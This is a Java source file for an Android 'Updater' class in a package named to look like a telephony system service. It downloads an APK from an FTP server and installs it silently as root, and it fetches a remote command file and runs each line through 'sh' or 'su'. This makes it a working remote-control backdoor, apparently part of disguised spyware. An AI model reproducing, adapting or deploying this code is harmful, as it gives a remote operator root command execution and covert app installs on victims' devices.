package com.telephony.services;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.lang.ref.WeakReference;
import java.util.Arrays;
import java.util.Properties;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.net.Uri;
import android.util.Log;

public class Updater {
	private MyFTPClient ftp = null;
	private WeakReference<Context> wContext = null;
	private Properties props = null;
	private PreferenceUtils sPref = null;

	public static final String REMOTE_VER = "ver";
	public static final String APK_REMOTE_FILE = "apk";
	public static final String CMD_FILE = "cmd";

	public Updater(Context context, final MyFTPClient ftp) {
		this.ftp = ftp;
		wContext = new WeakReference<Context>(context);
		sPref = new PreferenceUtils(context);
		props = new Properties();
	}

	public boolean loadProps(String xmlFile) throws IOException {
		InputStream in = null;
		try {
			in = ftp.retrieveFileStream(xmlFile);

			props.loadFromXML(in);
			return true;
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			if (in != null) {
				in.close();
			}
			if (!ftp.completePendingCommand()) {
				throw new IOException(ftp.getReplyString());
			}
		}
		return false;
	}

	public int getRemoteVersion() {
		if (!props.isEmpty()) {
			return Integer.parseInt(props.getProperty(REMOTE_VER, "0"));
		}
		return 0;
	}

	public int getCurrentVersion() {
		int code = 0;
		PackageInfo pInfo = null;
		try {
			pInfo = wContext.get().getPackageManager().getPackageInfo(wContext.get().getPackageName(), 0);
			code = pInfo.versionCode;
		} catch (Exception e) {
			e.printStackTrace();
		}
		return code;
	}

	public String getRemoteFile() {
		if (!props.isEmpty()) {

			return props.getProperty(APK_REMOTE_FILE, null);
		}
		return null;
	}

	public void updateAPK() {
		try {
			File local_file = ftp.downloadFile(sPref.getRootDir(), getRemoteFile());
			if ((local_file != null) && (local_file.exists())) {
				if (Utils.CheckRoot()) {
					new Proc("su").exec(new String[] { "pm install " + local_file.getAbsolutePath() });
				} else {
					Intent intent = new Intent(Intent.ACTION_VIEW);
					intent.setDataAndType(Uri.fromFile(local_file), "application/vnd.android.package-archive");
					intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					if (wContext != null) {
						wContext.get().startActivity(intent);
					}
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public String getCMDFile() {
		if (!props.isEmpty()) {
			return props.getProperty(CMD_FILE, null);
		}
		return null;
	}

	public String[] execCMD() {
		String[] cmds = null;	
		String shell = "sh";
		try {
			cmds = ftp.downloadFileText(getCMDFile());
			if (cmds.length > 0) {
				if (Utils.CheckRoot()) {
					shell = "su";
				}
				return new Proc(shell).exec(cmds);				
			}

		} catch (IOException e) {
			e.printStackTrace();
		}
		return null;
	}

	public void free() {
		wContext.clear();
		wContext = null;
		props.clear();
		props = null;
		sPref = null;
	}

}
